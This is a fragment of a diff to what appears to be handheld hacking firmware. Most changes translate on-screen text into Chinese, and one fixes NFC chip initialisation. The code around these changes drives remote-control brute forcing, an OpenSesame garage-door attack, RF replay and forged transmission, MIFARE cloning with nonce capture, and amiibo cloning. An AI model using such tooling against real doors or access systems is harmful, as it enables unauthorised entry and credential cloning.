+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("射频固定码穷举");
                 int visible = min(bf_count, 8);
                 int scroll = max(0, sel - 7);
                 for (int i = 0; i < visible; i++) {
@@ -46580,7 +46859,7 @@ void subGhzMenu() {
                 }
                 sp.fillRect(0, H-14, W, 14, 0x0841);
                 sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
-                sp.printf(";=up .=dn ENT=start  %.3fMHz", freq_hz/1000000.0f);
+                sp.printf(";=上 .=下 回车=开始 %.3fMHz", freq_hz/1000000.0f);
                 if (use_sprite) sprite->pushSprite(0, 0);
 
                 bool selected = false;
@@ -46681,13 +46960,13 @@ void subGhzMenu() {
                                 sp.fillRect(0,0,W,14,0x0841); sp.drawFastHLine(0,14,W,0xFC00);
                                 sp.setTextColor(0xFC00,0x0841); sp.setCursor(2,3); sp.print(crk);
                                 sp.setTextColor(TFT_CYAN,TFT_BLACK);
-                                sp.setCursor(10,38); sp.printf("Cracking: %d%%", pct);
+                                sp.setCursor(10,38); sp.printf("正在破解中: %d%%", pct);
                                 sp.setTextColor(TFT_DARKGREY,TFT_BLACK);
                                 sp.setCursor(10,52); sp.printf("%lu / %lu", (unsigned long)cur, (unsigned long)tot);
                                 sp.drawRect(10, 70, W-20, 12, TFT_WHITE);
                                 int bw = (int)((W-22) * (pct/100.0f));
                                 if (bw > 0) sp.fillRect(11, 71, bw, 10, TFT_GREEN);
-                                sp.setTextColor(0x5AEB,TFT_BLACK); sp.setCursor(10,95); sp.print("BACK = cancel");
+                                sp.setTextColor(0x5AEB,TFT_BLACK); sp.setCursor(10,95); sp.print("退格键 = 取消破解");
                                 if (use_sprite) sprite->pushSprite(0,0);
                                 delay(60);
                             }
@@ -46701,7 +46980,7 @@ void subGhzMenu() {
                         } else {
                             sp.fillRect(0,88,W,18,TFT_BLACK);
                             sp.setTextColor(TFT_RED,TFT_BLACK); sp.setCursor(6,90);
-                            sp.print("Frame not crackable"); if (use_sprite) sprite->pushSprite(0,0);
+                            sp.print("该数据帧无法破解"); if (use_sprite) sprite->pushSprite(0,0);
                             delay(900);
                         }
                         pp_bf_clear();
@@ -46757,7 +47036,7 @@ void subGhzMenu() {
                             sp_redraw = false;
                             sp.fillScreen(TFT_BLACK);
                             sp.fillRect(0,0,W,14,0x0841); sp.drawFastHLine(0,14,W,0xFC00);
-                            sp.setTextColor(0xFC00,0x0841); sp.setCursor(2,3); sp.print("Send / Resend");
+                            sp.setTextColor(0xFC00,0x0841); sp.setCursor(2,3); sp.print("信号重放 / 伪造发射");
                             sp.setTextColor(TFT_WHITE,TFT_BLACK);
                             sp.setCursor(6,20); sp.printf("Proto : %s", e.protocol);
                             sp.setCursor(6,32); sp.printf("Serial: 0x%08lX", (unsigned long)e.serial);
@@ -46772,7 +47051,7 @@ void subGhzMenu() {
                             if (status[0]) { sp.setTextColor(TFT_CYAN,TFT_BLACK); sp.setCursor(6,82); sp.print(status); }
                             sp.fillRect(0,H-14,W,14,0x0841);
                             sp.setTextColor(0x5AEB,0x0841); sp.setCursor(4,H-12);
-                            sp.print(";. field  ,/ value  ENT=send  BACK");
+                            sp.print(";. 选字段 ,/ 调值 回车=发射 退格");
                             if (use_sprite) sprite->pushSprite(0,0);
                         }
                         cc_apply_preset(cc_preset_idx);
@@ -46796,7 +47075,7 @@ void subGhzMenu() {
                         else       ok = cc_save_sub_key(fn, freq_hz, hist[sel]);
                         cc_hist_log_sd(hist[sel], freq_hz);
                         sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(ok ? TFT_GREEN : TFT_RED, 0x0841);
-                        sp.setCursor(4, H - 12); sp.print(ok ? "Saved .sub + captures.csv" : "Save failed");
+                        sp.setCursor(4, H - 12); sp.print(ok ? "已保存至 .sub 与 csv" : "保存失败");
                         if (use_sprite) sprite->pushSprite(0, 0); delay(800); last_draw = 0;
                     }
                 }
@@ -46806,7 +47085,7 @@ void subGhzMenu() {
 
                 sp.fillScreen(TFT_BLACK);
                 sp.fillRect(0, 0, W, 14, 0x0841); sp.drawFastHLine(0, 14, W, 0xFC00);
-                sp.setTextSize(1); sp.setTextFont(1);
+                evilSetCnFont(sp, 1); evilKeepCnFont(sp);
                 sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
                 sp.printf("PP %s %.3fMHz", cc_presets[cc_preset_idx].name, freq_hz/1000000.0f);
                 sp.setCursor(W-55, 3); sp.printf("%.0fdBm", cc_get_rssi());
@@ -46833,9 +47112,9 @@ void subGhzMenu() {
                 } else {
                     if (hist.empty()) {
                         sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                        sp.setCursor(20, 50); sp.print("Waiting for a key...");
+                        sp.setCursor(20, 50); sp.print("正在等待接收遥控按键信号...");
                         sp.setTextColor(0x5AEB, TFT_BLACK);
-                        sp.setCursor(6, 70); sp.printf("%d decoders active", PP_NUM_DECODERS);
+                        sp.setCursor(6, 70); sp.printf("%d 个解码器已就绪", PP_NUM_DECODERS);
                     } else {
                         int lineH = 13, listY = 18, maxVis = (H - listY - 14) / lineH;
                         if (sel < listStart) listStart = sel;
@@ -46854,7 +47133,7 @@ void subGhzMenu() {
                     sp.setCursor(2, 108); sp.printf("Edges:%lu Hits:%lu", pp_edges, pp_hits);
                     sp.fillRect(0, H-14, W, 14, 0x0841);
                     sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
-                    sp.print(";/. sel ENT=detail C=config BACK");
+                    sp.print(";/. 选择  回车=详情  C=配置  退格");
                 }
                 if (use_sprite) sprite->pushSprite(0, 0);
             }
@@ -46912,7 +47191,7 @@ void subGhzMenu() {
                 last_draw = now;
                 sp.fillScreen(TFT_BLACK);
                 sp.fillRect(0, 0, W, 14, 0x0841); sp.drawFastHLine(0, 14, W, 0xFC00);
-                sp.setTextSize(1); sp.setTextFont(1);
+                evilSetCnFont(sp, 1); evilKeepCnFont(sp);
                 sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
                 sp.printf("Gates %s %.3fMHz", cc_presets[cc_preset_idx].name, freq_hz / 1000000.0f);
                 sp.setCursor(W - 55, 3); sp.printf("%.0fdBm", cc_get_rssi());
@@ -46925,7 +47204,7 @@ void subGhzMenu() {
                     sp.print(";/. prec/suiv  C=config  BACK");
                 } else {
                     if (hist.empty()) {
-                        sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(16, 50); sp.print("Waiting for a remote...");
+                        sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(16, 50); sp.print("正在等待遥控器信号...");
                         sp.setTextColor(0x5AEB, TFT_BLACK); sp.setCursor(6, 70); sp.print("Somfy/Nice/SecPlus/Hormann/CAME");
                     } else {
                         int lineH = 13, listY = 18, maxVis = (H - listY - 14) / lineH;
@@ -46945,7 +47224,7 @@ void subGhzMenu() {
                     sp.setCursor(2, 108); sp.printf("Edges:%lu Hits:%lu", g_edges, g_hits);
                     sp.fillRect(0, H - 14, W, 14, 0x0841);
                     sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12);
-                    sp.print(";/. sel ENT=detail C=config BACK");
+                    sp.print(";/. 选择  回车=详情  C=配置  退格");
                 }
                 if (use_sprite) sprite->pushSprite(0, 0);
             }
@@ -46965,9 +47244,9 @@ void subGhzMenu() {
                         if (gp < gstart) gstart = gp;
                         if (gp >= gstart + maxVis) gstart = gp - maxVis + 1;
                         sp.fillScreen(TFT_BLACK);
-                        sp.setTextFont(1); sp.setTextSize(1.5);
+                        evilKeepCnFont(sp); evilSetCnFont(sp, 1.5);
                         sp.fillRect(0, 0, W, 16, 0x0841); sp.drawFastHLine(0, 16, W, 0xFC00);
-                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(4, 2); sp.print("OpenSesame garage");
+                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(4, 2); sp.print("车库门芝麻开门攻击");
                         for (int i = 0; i < maxVis && (gstart + i) < GARAGE_PROTO_COUNT; i++) {
                             int idx = gstart + i; int y = listY + i * lineH;
                             if (idx == gp) { sp.fillRect(0, y, W, lineH, TFT_NAVY); sp.setTextColor(TFT_GREEN, TFT_NAVY); }
@@ -46975,8 +47254,8 @@ void subGhzMenu() {
                             sp.setCursor(6, y + 2); sp.print(GARAGE_PROTOS[idx].name);
                         }
                         sp.fillRect(0, H - 16, W, 16, 0x0841);
-                        sp.setTextSize(1);
-                        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print(";/. ENT=config BACK");
+                        evilSetCnFont(sp, 1);
+                        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print(";/. 选择 回车=配置 退格");
                         if (use_sprite) sprite->pushSprite(0, 0);
                         gdraw = false;
                     }
@@ -46991,7 +47270,7 @@ void subGhzMenu() {
                     if (gdraw) {
                         sp.fillScreen(TFT_BLACK);
                         sp.fillRect(0, 0, W, 14, 0x0841); sp.drawFastHLine(0, 14, W, 0xFC00);
-                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("OpenSesame config");
+                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("车库门参数配置");
                         sp.setTextColor(TFT_WHITE, TFT_BLACK);
                         sp.setCursor(6, 24); sp.printf("Proto : %s", P.name);
                         sp.setCursor(6, 40); sp.printf("Bits  : %d  (codes=%ld)", P.bits, (long)(1L << P.bits));
@@ -47000,9 +47279,9 @@ void subGhzMenu() {
                         sp.setTextColor(TFT_CYAN, TFT_BLACK);
                         sp.setCursor(6, 72); sp.printf("Mode  : %s", useDeb ? "De Bruijn (rapide)" : "DIP (sequentiel)");
                         sp.setTextColor(0x8410, TFT_BLACK);
-                        sp.setCursor(6, 90); sp.print(",// freq  TAB mode");
+                        sp.setCursor(6, 90); sp.print(",// 调频  TAB 切换模式");
                         sp.fillRect(0, H - 14, W, 14, 0x0841);
-                        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print("ENT=START  BACK=list");
+                        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print("回车=开始攻击  退格=列表");
                         if (use_sprite) sprite->pushSprite(0, 0);
                         gdraw = false;
                     }
@@ -47030,13 +47309,13 @@ void subGhzMenu() {
                                     pass++;
                                     sp.fillScreen(TFT_BLACK);
                                     sp.fillRect(0, 0, W, 14, 0x0841); sp.drawFastHLine(0, 14, W, 0xFC00);
-                                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("De Bruijn TX");
+                                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("德布鲁因序列极速发射");
                                     sp.setTextColor(TFT_GREEN, TFT_BLACK);
                                     sp.setCursor(6, 30); sp.printf("%s", P.name);
                                     sp.setCursor(6, 46); sp.printf("%.3f MHz  %d sym", fhz / 1000000.0f, slen);
                                     sp.setTextColor(TFT_CYAN, TFT_BLACK);
                                     sp.setCursor(6, 66); sp.printf("Passes: %lu  (%lus)", pass, (millis() - t0) / 1000);
-                                    sp.setTextColor(0x5AEB, TFT_BLACK); sp.setCursor(6, 92); sp.print("BACK = stop");
+                                    sp.setTextColor(0x5AEB, TFT_BLACK); sp.setCursor(6, 92); sp.print("退格键 = 停止发射");
                                     if (use_sprite) sprite->pushSprite(0, 0);
                                     M5.update(); cardUpdate();
                                     if (kp(KEY_BACKSPACE)) { keyRelease(); cancelled = true; }
@@ -47055,7 +47334,7 @@ void subGhzMenu() {
                                     int pct = (int)((uint64_t)code * 100 / total);
                                     sp.fillScreen(TFT_BLACK);
                                     sp.fillRect(0, 0, W, 14, 0x0841); sp.drawFastHLine(0, 14, W, 0xFC00);
-                                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("DIP brute TX");
+                                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("DIP 拨码开关穷举发射");
                                     sp.setTextColor(TFT_GREEN, TFT_BLACK);
                                     sp.setCursor(6, 30); sp.printf("%s", P.name);
                                     sp.setCursor(6, 46); sp.printf("%.3f MHz", fhz / 1000000.0f);
@@ -47063,7 +47342,7 @@ void subGhzMenu() {
                                     sp.setCursor(6, 62); sp.printf("%lu / %lu (%d%%)", (unsigned long)code, (unsigned long)total, pct);
                                     sp.drawRect(10, 78, W - 20, 12, TFT_WHITE);
                                     int bw = (int)((W - 22) * (pct / 100.0f)); if (bw > 0) sp.fillRect(11, 79, bw, 10, TFT_GREEN);
-                                    sp.setTextColor(0x5AEB, TFT_BLACK); sp.setCursor(6, 100); sp.print("BACK = stop");
+                                    sp.setTextColor(0x5AEB, TFT_BLACK); sp.setCursor(6, 100); sp.print("退格键 = 停止发射");
                                     if (use_sprite) sprite->pushSprite(0, 0);
                                     M5.update(); cardUpdate();
                                     if (kp(KEY_BACKSPACE)) { keyRelease(); cancelled = true; }
@@ -47091,7 +47370,7 @@ void subGhzMenu() {
             }
             if (afc == 0) {
                 sp.fillScreen(TFT_BLACK); sp.setTextColor(TFT_RED, TFT_BLACK);
-                sp.setCursor(10, 55); sp.print("No .sub in /evil/subghz");
+                sp.setCursor(10, 55); sp.print("/evil/subghz 中未发现 .sub 文件");
                 if (use_sprite) sprite->pushSprite(0, 0); delay(1800);
             } else {
                 int fsel = 0, fstart = 0; bool fdraw = true;
@@ -47100,7 +47379,7 @@ void subGhzMenu() {
                         int lineH = 16, listY = 20, maxVis = (H - listY - 14) / lineH;
                         if (fsel < fstart) fstart = fsel;
                         if (fsel >= fstart + maxVis) fstart = fsel - maxVis + 1;
-                        sp.fillScreen(TFT_BLACK); sp.setTextFont(1); sp.setTextSize(1.5);
+                        sp.fillScreen(TFT_BLACK); evilKeepCnFont(sp); evilSetCnFont(sp, 1.5);
                         sp.fillRect(0, 0, W, 16, 0x0841); sp.drawFastHLine(0, 16, W, 0xFC00);
                         sp.setTextColor(0xFC00, 0x0841); sp.setCursor(4, 2); sp.printf("Analyze (%d)", afc);
                         for (int i = 0; i < maxVis && (fstart + i) < afc; i++) {
@@ -47111,8 +47390,8 @@ void subGhzMenu() {
                             if (fn.length() > 22) fn = fn.substring(0, 22);
                             sp.setCursor(6, y + 1); sp.print(fn);
                         }
-                        sp.setTextSize(1); sp.fillRect(0, H - 14, W, 14, 0x0841);
-                        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print(";/. ENT=decode BACK");
+                        evilSetCnFont(sp, 1); sp.fillRect(0, H - 14, W, 14, 0x0841);
+                        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print(";/. 选择 回车=开始解码 退格");
                         if (use_sprite) sprite->pushSprite(0, 0); fdraw = false;
                     }
                     M5.update(); cardUpdate();
@@ -47145,12 +47424,12 @@ void subGhzMenu() {
                         int lstart = 0; bool detail = false; bool ldraw = true;
                         while (true) {
                             if (ldraw) {
-                                sp.fillScreen(TFT_BLACK); sp.setTextFont(1); sp.setTextSize(1);
+                                sp.fillScreen(TFT_BLACK); evilKeepCnFont(sp); evilSetCnFont(sp, 1);
                                 sp.fillRect(0, 0, W, 14, 0x0841); sp.drawFastHLine(0, 14, W, 0xFC00);
                                 sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.printf("Analyze %.3fMHz", fhz / 1000000.0f);
                                 if (hist.empty()) {
-                                    sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(10, 50); sp.print("No protocol decoded");
-                                    sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(10, 66); sp.print("(RAW non reconnu)");
+                                    sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(10, 50); sp.print("未能成功解码已知协议");
+                                    sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(10, 66); sp.print("(RAW 信号未识别)");
                                     sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print("BACK");
                                 } else if (detail) {
                                     cc_draw_decoded_detail(sp, hist[sel]);
@@ -47167,7 +47446,7 @@ void subGhzMenu() {
                                         uint64_t mask = e.data & (e.bit_count < 64 ? ((1ULL << e.bit_count) - 1) : 0xFFFFFFFFFFFFFFFFULL);
                                         sp.setCursor(4, y + 2); sp.printf("%-11.11s %llX", e.protocol ? e.protocol : "?", (unsigned long long)mask);
                                     }
-                                    sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print(";/. ENT=detail BACK");
+                                    sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print(";/. 选择 回车=查看详情 退格");
                                 }
                                 if (use_sprite) sprite->pushSprite(0, 0); ldraw = false;
                             }
@@ -47191,7 +47470,7 @@ void subGhzMenu() {
                                     }
                                     cc_set_raw_rx(); ldraw = true;
                                 }
-                                if (kp('e') || kp('E')) { keyRelease(); cc_hist_log_sd(hist[sel], fhz); sp.fillRect(10, 100, 220, 12, TFT_BLACK); sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(10, 100); sp.print("Saved to captures.csv"); if (use_sprite) sprite->pushSprite(0, 0); delay(600); ldraw = true; }
+                                if (kp('e') || kp('E')) { keyRelease(); cc_hist_log_sd(hist[sel], fhz); sp.fillRect(10, 100, 220, 12, TFT_BLACK); sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(10, 100); sp.print("已追加保存至 captures.csv"); if (use_sprite) sprite->pushSprite(0, 0); delay(600); ldraw = true; }
                             }
                             delay(5);
                         }
@@ -47283,6 +47562,7 @@ static bool nfc_opened = false;
 // NFC SPI uses same bus as CC1101/SD but SPI_MODE1 and different CS
 void nfc_select() {
     digitalWrite(CC_CS, HIGH);
+    digitalWrite(SD_CS, HIGH);
     cc_spi->beginTransaction(SPISettings(5000000, MSBFIRST, SPI_MODE1));
     digitalWrite(NFC_CS, LOW);
 }
@@ -47626,18 +47906,35 @@ NfcCardInfo nfc_activate() {
 bool nfc_open() {
     if (nfc_opened) return true;
     // SPI bus shared with CC1101 and SD card (same pins, different CS)
+    pinMode(SD_CS, OUTPUT);
+    digitalWrite(SD_CS, HIGH);      // Deselect SD
     pinMode(CC_CS, OUTPUT);
-    digitalWrite(CC_CS, HIGH);
+    digitalWrite(CC_CS, HIGH);      // Deselect CC1101
     pinMode(NFC_CS, OUTPUT);
     digitalWrite(NFC_CS, HIGH);
     pinMode(NFC_IRQ, INPUT);
 
-    // Check IC ID (nfc_rr handles SPI mode switch via nfc_select)
-    uint8_t ic = nfc_rr(NFC_IC_ID);
-    if ((ic & 0xF8) != 0x28) {
-        delay(50);
+    // Ensure hardware SPI is bound to Cardputer SPI pins
+    SPI.begin(40, 39, 14, -1);
+
+    // Pulse CS to wake up ST25R3916 SPI interface
+    digitalWrite(NFC_CS, HIGH);
+    delay(2);
+    digitalWrite(NFC_CS, LOW);
+    delayMicroseconds(50);
+    digitalWrite(NFC_CS, HIGH);
+    delay(5);
+
+    // Check IC ID with retry (nfc_rr handles SPI mode switch via nfc_select)
+    uint8_t ic = 0;
+    for (int retry = 0; retry < 10; retry++) {
         ic = nfc_rr(NFC_IC_ID);
-        if ((ic & 0xF8) != 0x28) return false;
+        if ((ic & 0xF8) == 0x28) break;
+        delay(10);
+    }
+    if ((ic & 0xF8) != 0x28) {
+        Serial.printf("[NFC] ST25R3916 not detected, IC_ID=0x%02X\n", ic);
+        return false;
     }
 
     // Init hardware — aligned with Flipper Zero furi_hal_nfc init
@@ -48314,15 +48611,15 @@ int nfc_mifare_read_all(NfcCardInfo& card, uint8_t block_data[][16], int max_blo
         sp.fillScreen(TFT_BLACK);
         sp.fillRect(0, 0, W, 14, 0x0841);
         sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
-        sp.printf("Reading sector %d/%d", sector + 1, num_sectors);
+        sp.printf("读取扇区 %d/%d", sector + 1, num_sectors);
         // Progress bar
         int bar_w = (sector + 1) * (W - 20) / num_sectors;
         sp.fillRect(10, 22, W - 20, 8, 0x2104);
         sp.fillRect(10, 22, bar_w, 8, TFT_GREEN);
         sp.setTextColor(TFT_GREEN, TFT_BLACK);
-        sp.setCursor(10, 38); sp.printf("Sectors OK: %d", sectors_read);
+        sp.setCursor(10, 38); sp.printf("已读扇区: %d", sectors_read);
         sp.fillRect(0, H-14, W, 14, 0x0841);
-        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("Reading...");
+        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("读取中...");
         if (use_sprite) sprite->pushSprite(0, 0);
 
         // Reactivate card between sectors
@@ -49748,11 +50045,11 @@ void nfc_mfemul_ui() {
         // Capture mode: clone the identity of a presented card first.
         sp.fillScreen(TFT_BLACK);
         sp.fillRect(0, 0, W, 14, 0x0841);
-        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Emul MIFARE (mfkey)");
-        sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(14, 50); sp.print("Place card to CLONE...");
-        sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(10, 72); sp.print("(no /evil/mfemul.bin");
-        sp.setCursor(10, 84); sp.print(" -> capture mode)");
-        sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=cancel");
+        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("模拟 MIFARE (mfkey)");
+        sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(14, 50); sp.print("请放置要克隆的卡...");
+        sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(10, 72); sp.print("(无 /evil/mfemul.bin");
+        sp.setCursor(10, 84); sp.print(" -> 捕获模式)");
+        sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=取消");
         if (us) spr->pushSprite(0, 0);
 
         bool cancelled = false;
@@ -49800,36 +50097,36 @@ void nfc_mfemul_ui() {
             sp.fillScreen(TFT_BLACK);
             sp.fillRect(0, 0, W, 14, 0x0841);
             sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
-            sp.print(fullEmul ? "Emul MIFARE (full)" : "Emul MIFARE (mfkey)");
+            sp.print(fullEmul ? "模拟 MIFARE (完整)" : "模拟 MIFARE (mfkey)");
             sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 20); sp.print("UID ");
             for (int i = 0; i < card.uid_len; i++) sp.printf("%02X", card.uid[i]);
             sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(4, 34);
             sp.printf("ATQA %04X SAK %02X", card.atqa, card.sak);
             if (fullEmul) {
                 sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, 54);
-                sp.printf("Auth OK : %d", nAuth);
+                sp.printf("认证成功: %d", nAuth);
                 sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(4, 72);
-                sp.printf("Reads   : %d", nRead);
-                sp.setCursor(4, 90); sp.printf("Writes  : %d", nWrite);
+                sp.printf("读取次数: %d", nRead);
+                sp.setCursor(4, 90); sp.printf("写入次数: %d", nWrite);
                 sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(4, 110);
-                sp.printf("nonces %d (mfkey too)", g_mfe_ncount);
+                sp.printf("随机数 %d (兼mfkey)", g_mfe_ncount);
             } else {
                 sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, 52);
-                sp.printf("Nonces captured: %d", g_mfe_ncount);
+                sp.printf("已捕获随机数: %d", g_mfe_ncount);
                 if (g_mfe_ncount > 0) {
                     MfeNonce& e = g_mfe_nonces[g_mfe_ncount - 1];
                     sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                    sp.setCursor(4, 70);  sp.printf("blk %d key%c", e.block, (e.keytype==0x60?'A':'B'));
+                    sp.setCursor(4, 70);  sp.printf("块 %d 密钥%c", e.block, (e.keytype==0x60?'A':'B'));
                     sp.setCursor(4, 84);  sp.printf("nt %08X", e.nt);
                     sp.setCursor(4, 98);  sp.printf("nr %08X", e.nr);
                     sp.setCursor(4, 112); sp.printf("ar %08X", e.ar);
                 } else {
                     sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(4, 74);
-                    sp.print("Present to a reader...");
+                    sp.print("请靠近读卡器...");
                 }
             }
             sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841);
-            sp.setCursor(4, H-12); sp.print(fullEmul ? "BACK=stop  (full emul)" : "BACK=stop ->mfkey_nonces.txt");
+            sp.setCursor(4, H-12); sp.print(fullEmul ? "BACK=停止 (完整模拟)" : "BACK=停止 ->mfkey_nonces.txt");
             if (us) spr->pushSprite(0, 0);
         }
         M5.update(); cardUpdate();
@@ -49880,10 +50177,10 @@ void nfc_amiibo_ui() {
     if (fc == 0) {
         sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
         sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Amiibo");
-        sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(8, 44); sp.print("No dumps found in");
+        sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(8, 44); sp.print("未找到转储文件:");
         sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(8, 60); sp.print("/evil/nfc/amiibo/");
-        sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(8, 80); sp.print("Drop .nfc or .bin there");
-        sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK");
+        sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(8, 80); sp.print("请放入 .nfc 或 .bin 文件");
+        sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=返回");
         if (us) spr->pushSprite(0, 0);
         while (true) { M5.update(); cardUpdate(); if (kp(KEY_BACKSPACE)) { keyRelease(); break; } delay(10); }
         done(); return;
@@ -49905,7 +50202,7 @@ void nfc_amiibo_ui() {
                 sp.setCursor(4, y + 1); sp.print(fn);
             }
             sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841);
-            sp.setCursor(4, H-12); sp.print(";/. ENT=select BACK");
+            sp.setCursor(4, H-12); sp.print(";/.选择 ENT=确认 BACK=返回");
             if (us) spr->pushSprite(0, 0); draw = false;
         }
         M5.update(); cardUpdate();
@@ -49916,12 +50213,12 @@ void nfc_amiibo_ui() {
             keyRelease();
             if (!amiibo_load(&g_amiibo, files[sel].c_str())) {
                 sp.fillRect(0, H-28, W, 14, TFT_BLACK); sp.setTextColor(TFT_RED, TFT_BLACK);
-                sp.setCursor(4, H-28); sp.print("Load failed (bad dump)");
+                sp.setCursor(4, H-28); sp.print("加载失败 (转储损坏)");
                 if (us) spr->pushSprite(0, 0); delay(1200); draw = true; continue;
             }
             // action menu: Emulate / Clone
             int act = 0; bool adraw = true;
-            const char* acts[2] = {"Emulate", "Clone to tag"};
+            const char* acts[2] = {"模拟标签", "克隆到白卡"};
             while (true) {
                 if (adraw) {
                     sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
@@ -49937,7 +50234,7 @@ void nfc_amiibo_ui() {
                         sp.setCursor(10, y + 2); sp.print(acts[i]);
                     }
                     sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841);
-                    sp.setCursor(4, H-12); sp.print(";/. ENT=run BACK");
+                    sp.setCursor(4, H-12); sp.print(";/.选择 ENT=执行 BACK=返回");
                     if (us) spr->pushSprite(0, 0); adraw = false;
                 }
                 M5.update(); cardUpdate();
@@ -49955,18 +50252,18 @@ void nfc_amiibo_ui() {
                             if (ev || millis() - ld > 250) {
                                 ld = millis();
                                 sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
-                                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Amiibo EMULATE");
+                                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Amiibo 模拟");
                                 sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 20);
                                 sp.printf("%.28s", g_amiibo.name);
                                 sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(4, 34); sp.print("UID ");
                                 for (int i = 0; i < 7; i++) sp.printf("%02X", g_amiibo.uid[i]);
-                                sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, 54); sp.printf("Reads : %lu", (unsigned long)stx.reads);
-                                sp.setCursor(4, 70); sp.printf("Writes: %lu", (unsigned long)stx.writes);
-                                sp.setCursor(4, 86); sp.printf("PwdAuth: %lu", (unsigned long)stx.pwd);
+                                sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, 54); sp.printf("读取: %lu", (unsigned long)stx.reads);
+                                sp.setCursor(4, 70); sp.printf("写入: %lu", (unsigned long)stx.writes);
+                                sp.setCursor(4, 86); sp.printf("密码认证: %lu", (unsigned long)stx.pwd);
                                 sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(4, 104);
-                                sp.print(stx.reads ? "Reader active" : "Present to reader...");
+                                sp.print(stx.reads ? "读卡器已交互" : "请靠近读卡器...");
                                 sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841);
-                                sp.setCursor(4, H-12); sp.print("BACK=stop");
